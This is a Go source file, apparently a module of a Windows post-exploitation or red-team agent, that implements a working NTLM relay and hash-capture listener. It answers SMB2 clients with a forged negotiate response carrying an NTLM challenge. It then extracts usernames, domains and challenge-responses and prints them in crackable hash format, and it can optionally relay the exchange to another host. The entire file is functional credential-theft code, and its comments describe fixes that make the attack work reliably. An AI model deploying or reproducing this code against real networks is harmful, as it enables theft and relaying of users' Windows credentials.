//go:build windows

package main

import (
	"crypto/rand"
	"encoding/binary"
	"encoding/hex"
	"fmt"
	"net"
	"strings"
	"sync"
	"time"
)

// CapturedNTLMHash holds one captured Net-NTLM credential.
type CapturedNTLMHash struct {
	Username        string
	Domain          string
	ServerChallenge string // hex-encoded 8-byte challenge
	NTResponse      string // hex-encoded NtChallengeResponse
	LMResponse      string // hex-encoded LmChallengeResponse
	NTLMv2          bool
	Timestamp       time.Time
	SourceAddr      string
}

type ntlmRelay struct {
	listener    net.Listener
	stopCh      chan struct{}
	hashes      []CapturedNTLMHash
	forwardAddr string
	mu          sync.Mutex
}

var (
	relayMu     sync.Mutex
	activeRelay *ntlmRelay
)

// startNTLMRelay starts a TCP listener that captures Net-NTLM hashes
// and optionally relays the NTLM exchange to a forward target.
func startNTLMRelay(listenAddr, forwardTarget string) (string, error) {
	relayMu.Lock()
	defer relayMu.Unlock()

	if activeRelay != nil {
		return "", fmt.Errorf("NTLM relay already active on %s", activeRelay.listener.Addr())
	}

	ln, err := net.Listen("tcp", listenAddr)
	if err != nil {
		return "", fmt.Errorf("relay listen: %w", err)
	}

	r := &ntlmRelay{
		listener:    ln,
		stopCh:      make(chan struct{}),
		forwardAddr: forwardTarget,
	}
	activeRelay = r

	go r.acceptLoop()

	msg := fmt.Sprintf("NTLM relay listening on %s", listenAddr)
	if forwardTarget != "" {
		msg += fmt.Sprintf(", forwarding to %s", forwardTarget)
	}
	return msg, nil
}

// stopNTLMRelay stops the active relay and returns captured hashes.
func stopNTLMRelay() (string, error) {
	relayMu.Lock()
	defer relayMu.Unlock()

	if activeRelay == nil {
		return "", fmt.Errorf("no active NTLM relay")
	}

	close(activeRelay.stopCh)
	activeRelay.listener.Close()

	activeRelay.mu.Lock()
	hashes := activeRelay.hashes
	activeRelay.mu.Unlock()

	addr := activeRelay.listener.Addr()
	activeRelay = nil

	var b strings.Builder
	b.WriteString(fmt.Sprintf("NTLM relay on %s stopped. Captured %d hash(es):\n", addr, len(hashes)))
	for i, h := range hashes {
		b.WriteString(fmt.Sprintf("\n[%d] %s\\%s\n", i+1, h.Domain, h.Username))
		b.WriteString(fmt.Sprintf("    Source: %s\n", h.SourceAddr))
		b.WriteString(fmt.Sprintf("    Timestamp: %s\n", h.Timestamp.Format(time.RFC3339)))
		if h.NTLMv2 {
			b.WriteString(fmt.Sprintf("    Hash: %s::%s:%s:%s\n",
				h.Username, h.Domain, h.ServerChallenge, h.NTResponse))
		} else {
			b.WriteString(fmt.Sprintf("    Hash: %s::%s:%s:%s:%s\n",
				h.Username, h.Domain, h.ServerChallenge, h.LMResponse, h.NTResponse))
		}
	}
	return b.String(), nil
}

func (r *ntlmRelay) acceptLoop() {
	for {
		conn, err := r.listener.Accept()
		if err != nil {
			select {
			case <-r.stopCh:
				return
			default:
				continue
			}
		}
		go r.handleConnection(conn)
	}
}

func (r *ntlmRelay) handleConnection(victim net.Conn) {
	defer victim.Close()

	sourceAddr := victim.RemoteAddr().String()

	if r.forwardAddr == "" {
		// Capture-only mode: we complete the NTLM handshake and capture the hash.
		r.captureOnly(victim, sourceAddr)
		return
	}

	// Relay mode: proxy TCP bytes while capturing NTLM messages.
	target, err := net.DialTimeout("tcp", r.forwardAddr, 10*time.Second)
	if err != nil {
		return
	}
	defer target.Close()

	var (
		challenge []byte
		hash      *CapturedNTLMHash
		mu        sync.Mutex
		wg        sync.WaitGroup
	)

	wg.Add(2)

	// victim -> target
	go func() {
		defer wg.Done()
		buf := make([]byte, 65536)
		for {
			n, err := victim.Read(buf)
			if err != nil {
				return
			}
			data := make([]byte, n)
			copy(data, buf[:n])

			mu.Lock()
			h := extractNTLMAuthFromStream(data)
			if h != nil {
				hash = h
				hash.SourceAddr = sourceAddr
			}
			mu.Unlock()

			_, _ = target.Write(data)
		}
	}()

	// target -> victim
	go func() {
		defer wg.Done()
		buf := make([]byte, 65536)
		for {
			n, err := target.Read(buf)
			if err != nil {
				return
			}
			data := make([]byte, n)
			copy(data, buf[:n])

			mu.Lock()
			c := extractNTLMChallengeFromStream(data)
			if c != nil {
				challenge = c
			}
			mu.Unlock()

			_, _ = victim.Write(data)
		}
	}()

	wg.Wait()

	mu.Lock()
	if hash != nil && challenge != nil {
		hash.ServerChallenge = hex.EncodeToString(challenge)
		r.mu.Lock()
		r.hashes = append(r.hashes, *hash)
		r.mu.Unlock()
	}
	mu.Unlock()
}

// captureOnly completes the NTLM exchange to capture the hash without relaying.
func (r *ntlmRelay) captureOnly(conn net.Conn, sourceAddr string) {
	// We wait for the SMB2 negotiate, respond with our own negotiate
	// that triggers NTLM auth, capture the challenge/response.
	// For simplicity, read until we get an NTLMSSP message.
	buf := make([]byte, 4096)
	conn.SetReadDeadline(time.Now().Add(15 * time.Second))

	total := 0
	for {
		n, err := conn.Read(buf[total:])
		if err != nil {
			return
		}
		total += n
		data := buf[:total]

		// Look for NTLMSSP in the data
		idx := findNTLMSSP(data)
		if idx < 0 {
			continue
		}

		ntlmData := data[idx:]
		if len(ntlmData) < 12 {
			continue
		}
		msgType := binary.LittleEndian.Uint32(ntlmData[8:12])

		switch msgType {
		case 1: // Negotiate — respond with challenge
			chal := generateNTLMChallenge()
			_, err := conn.Write(chal)
			if err != nil {
				return
			}
		case 3: // Authenticate — extract hash
			h := parseNTLMAuth(ntlmData)
			if h != nil {
				h.SourceAddr = sourceAddr
				h.Timestamp = time.Now()
				r.mu.Lock()
				r.hashes = append(r.hashes, *h)
				r.mu.Unlock()
			}
			return
		}
	}
}

// ── NTLM Stream Parsing ──

func findNTLMSSP(data []byte) int {
	// NTLMSSP\0 marker
	for i := 0; i < len(data)-7; i++ {
		if data[i] == 'N' && data[i+1] == 'T' && data[i+2] == 'L' && data[i+3] == 'M' &&
			data[i+4] == 'S' && data[i+5] == 'S' && data[i+6] == 'P' && data[i+7] == 0 {
			return i
		}
	}
	return -1
}

func extractNTLMChallengeFromStream(data []byte) []byte {
	idx := findNTLMSSP(data)
	if idx < 0 {
		return nil
	}
	ntlmData := data[idx:]
	if len(ntlmData) < 12 {
		return nil
	}
	msgType := binary.LittleEndian.Uint32(ntlmData[8:12])
	if msgType != 2 {
		return nil
	}
	if len(ntlmData) < 40 {
		return nil
	}
	challenge := make([]byte, 8)
	copy(challenge, ntlmData[24:32])
	return challenge
}

func extractNTLMAuthFromStream(data []byte) *CapturedNTLMHash {
	idx := findNTLMSSP(data)
	if idx < 0 {
		return nil
	}
	ntlmData := data[idx:]
	return parseNTLMAuth(ntlmData)
}

func parseNTLMAuth(data []byte) *CapturedNTLMHash {
	if len(data) < 12 {
		return nil
	}
	msgType := binary.LittleEndian.Uint32(data[8:12])
	if msgType != 3 {
		return nil
	}
	if len(data) < 64 {
		return nil
	}

	lmRespLen := int(binary.LittleEndian.Uint16(data[12:14]))
	lmRespOff := int(binary.LittleEndian.Uint32(data[16:20]))
	ntRespLen := int(binary.LittleEndian.Uint16(data[20:22]))
	ntRespOff := int(binary.LittleEndian.Uint32(data[24:28]))
	domainLen := int(binary.LittleEndian.Uint16(data[28:30]))
	domainOff := int(binary.LittleEndian.Uint32(data[32:36]))
	userLen := int(binary.LittleEndian.Uint16(data[36:38]))
	userOff := int(binary.LittleEndian.Uint32(data[40:44]))

	if userOff+userLen > len(data) || domainOff+domainLen > len(data) ||
		lmRespOff+lmRespLen > len(data) || ntRespOff+ntRespLen > len(data) {
		return nil
	}

	userBytes := data[userOff : userOff+userLen]
	domainBytes := data[domainOff : domainOff+domainLen]

	username := decodeUTF16(userBytes)
	domain := decodeUTF16(domainBytes)

	h := &CapturedNTLMHash{
		Username:   username,
		Domain:     domain,
		LMResponse: hex.EncodeToString(data[lmRespOff : lmRespOff+lmRespLen]),
		NTResponse: hex.EncodeToString(data[ntRespOff : ntRespOff+ntRespLen]),
		Timestamp:  time.Now(),
	}

	// Determine if NTLMv2: NT response > 24 bytes indicates v2
	if ntRespLen > 24 {
		h.NTLMv2 = true
	}

	return h
}

func decodeUTF16(b []byte) string {
	if len(b) < 2 {
		return ""
	}
	chars := make([]uint16, len(b)/2)
	for i := range chars {
		chars[i] = binary.LittleEndian.Uint16(b[i*2:])
	}
	// Strip null terminator
	if len(chars) > 0 && chars[len(chars)-1] == 0 {
		chars = chars[:len(chars)-1]
	}
	return utf16Decode(chars)
}

func utf16Decode(s []uint16) string {
	// Simple conversion, handles BMP only (most NTLM usernames/domains are ASCII or BMP)
	buf := make([]byte, len(s)*3)
	n := 0
	for _, r := range s {
		if r < 0x80 {
			buf[n] = byte(r)
			n++
		} else if r < 0x800 {
			buf[n] = 0xC0 | byte(r>>6)
			buf[n+1] = 0x80 | byte(r&0x3F)
			n += 2
		} else {
			buf[n] = 0xE0 | byte(r>>12)
			buf[n+1] = 0x80 | byte((r>>6)&0x3F)
			buf[n+2] = 0x80 | byte(r&0x3F)
			n += 3
		}
	}
	return string(buf[:n])
}

// generateNTLMChallenge builds a minimal SMB2 Negotiate Response
// containing an NTLM CHALLENGE message.
func generateNTLMChallenge() []byte {
	// Build a minimal NTLM CHALLENGE_MESSAGE (type 2)
	serverChallenge := make([]byte, 8)
	// The server challenge is the per-session nonce the client binds its
	// Net-NTLM response to (NtProofStr = HMAC-MD5(..., ServerChallenge||...)).
	// It must be unpredictable and unique per session. This previously shipped
	// a FIXED constant ("pseudo-random for now"), so every relay session
	// emitted the same nonce: predictable, and two concurrent relays collided,
	// letting a response captured for one session be tied to (or replayed into)
	// another. Draw fresh bytes from the CSPRNG each call.
	if _, err := rand.Read(serverChallenge); err != nil {
		// CSPRNG failure is effectively unreachable on Windows, but never fall
		// back to the fixed value: derive from the clock so the nonce is still
		// session-varying.
		binary.LittleEndian.PutUint64(serverChallenge, uint64(time.Now().UnixNano()))
	}

	// NTLMSSP header + Type 2 fields
	ntlm := make([]byte, 0, 56)
	// Signature "NTLMSSP\0"
	ntlm = append(ntlm, []byte("NTLMSSP\x00")...)
	// MessageType = 2
	buf := make([]byte, 4)
	binary.LittleEndian.PutUint32(buf, 2)
	ntlm = append(ntlm, buf...)
	// TargetNameLen, TargetNameMaxLen, TargetNameBufferOffset (all zero for no target)
	binary.LittleEndian.PutUint16(buf[:2], 0)
	ntlm = append(ntlm, buf[:2]...)
	ntlm = append(ntlm, buf[:2]...)
	binary.LittleEndian.PutUint32(buf, 56) // after NTLM header
	ntlm = append(ntlm, buf...)
	// NegotiateFlags: NTLMSSP_NEGOTIATE_KEY_EXCH | NTLMSSP_NEGOTIATE_128 | NTLMSSP_NEGOTIATE_56 | NTLMSSP_NEGOTIATE_VERSION | NTLMSSP_NEGOTIATE_EXTENDED_SESSION | NTLMSSP_NEGOTIATE_ALWAYS_SIGN | NTLMSSP_NEGOTIATE_NTLM | NTLMSSP_REQUEST_TARGET | NTLMSSP_NEGOTIATE_UNICODE
	flags := uint32(0xE22882D5)
	binary.LittleEndian.PutUint32(buf, flags)
	ntlm = append(ntlm, buf...)
	// ServerChallenge (8 bytes)
	ntlm = append(ntlm, serverChallenge...)
	// Reserved (8 bytes)
	ntlm = append(ntlm, make([]byte, 8)...)
	// TargetInfoLen, TargetInfoMaxLen, TargetInfoBufferOffset (all zero)
	binary.LittleEndian.PutUint16(buf[:2], 0)
	ntlm = append(ntlm, buf[:2]...)
	ntlm = append(ntlm, buf[:2]...)
	binary.LittleEndian.PutUint32(buf, 0)
	ntlm = append(ntlm, buf...)
	// Version (8 bytes): Windows 10.0.20348
	ntlm = append(ntlm, 0x0A, 0x00, // major, minor
		0x4F, 0xB4, // build
		0x00, 0x00, 0x00, 0x0F) // reserved + NTLMSSP_REVISION_W2K3

	// Now wrap in SMB2 Negotiate Response
	// SMB2 header (64 bytes)
	smb2 := make([]byte, 64)
	// ProtocolId: 0xFE 0x53 0x4D 0x42
	smb2[0] = 0xFE
	smb2[1] = 0x53
	smb2[2] = 0x4D
	smb2[3] = 0x42
	// StructureSize: 64
	binary.LittleEndian.PutUint16(smb2[4:6], 64)
	// CreditCharge: 1
	binary.LittleEndian.PutUint16(smb2[6:8], 1)
	// Status: STATUS_SUCCESS
	binary.LittleEndian.PutUint32(smb2[8:12], 0)
	// Command: SMB2_NEGOTIATE (0x0000)
	binary.LittleEndian.PutUint16(smb2[12:14], 0)
	// Credits: 1
	binary.LittleEndian.PutUint16(smb2[14:16], 1)
	// Flags: SERVER_TO_REDIR
	binary.LittleEndian.PutUint32(smb2[16:20], 0x00000001)
	// NextCommand: 0
	// MessageId: 0 (keep from client)
	// TreeId: 0
	// SessionId: 0

	// SMB2 Negotiate Response body
	negResp := make([]byte, 0, 64+65+len(ntlm))
	negResp = append(negResp, smb2...)
	// StructureSize: 65
	negResp = append(negResp, 65, 0)
	// SecurityMode: SMB2_NEGOTIATE_SIGNING_ENABLED
	negResp = append(negResp, 0x01, 0x00)
	// DialectRevision: SMB 3.1.1 (0x0311)
	negResp = append(negResp, 0x11, 0x03)
	// Reserved
	negResp = append(negResp, 0, 0)
	// ServerGuid (16 bytes)
	negResp = append(negResp, make([]byte, 16)...)
	// Capabilities
	binary.LittleEndian.PutUint32(buf, 0x0000007F)
	negResp = append(negResp, buf...)
	// MaxTransactSize: 65536
	binary.LittleEndian.PutUint32(buf, 65536)
	negResp = append(negResp, buf...)
	// MaxReadSize: 65536
	binary.LittleEndian.PutUint32(buf, 65536)
	negResp = append(negResp, buf...)
	// MaxWriteSize: 65536
	binary.LittleEndian.PutUint32(buf, 65536)
	negResp = append(negResp, buf...)
	// SystemTime (8 bytes) + ServerStartTime (8 bytes). These MUST use an
	// 8-byte buffer: the shared `buf` above is only 4 bytes (sized for the
	// 32-bit Capabilities/Max* fields), so an earlier `buf[:8]` here sliced a
	// 4-byte buffer out of range and PANICKED on every negotiate — silently
	// breaking the whole NTLM relay. It went unnoticed because this file is
	// //go:build windows and CI compiles the agent package on Linux, so the
	// function was never executed in the suite.
	var sysTime [8]byte
	binary.LittleEndian.PutUint64(sysTime[:], uint64(time.Now().UnixNano()/100))
	negResp = append(negResp, sysTime[:]...)
	negResp = append(negResp, sysTime[:]...)
	// SecurityBufferOffset: offset from start
	secOff := uint16(64 + 65) // header + fixed body
	binary.LittleEndian.PutUint16(buf[:2], secOff)
	negResp = append(negResp, buf[:2]...)
	// SecurityBufferLength
	binary.LittleEndian.PutUint16(buf[:2], uint16(len(ntlm)))
	negResp = append(negResp, buf[:2]...)
	// Reserved2 (4 bytes)
	negResp = append(negResp, 0, 0, 0, 0)
	// SecurityBuffer (NTLMSSP_CHALLENGE)
	negResp = append(negResp, ntlm...)

	return negResp
}
